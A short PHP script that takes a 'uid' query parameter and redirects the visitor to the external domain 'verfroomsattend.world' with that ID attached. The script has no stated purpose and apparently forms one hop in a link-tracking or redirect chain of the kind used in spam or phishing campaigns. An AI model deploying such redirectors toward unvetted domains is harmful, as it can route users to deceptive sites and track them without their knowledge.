<?php
$uid = isset($_GET['uid']) ? urlencode($_GET['uid']) : '';
$target = "https://verfroomsattend.world";
header("Location: $target?uid=$uid");
exit;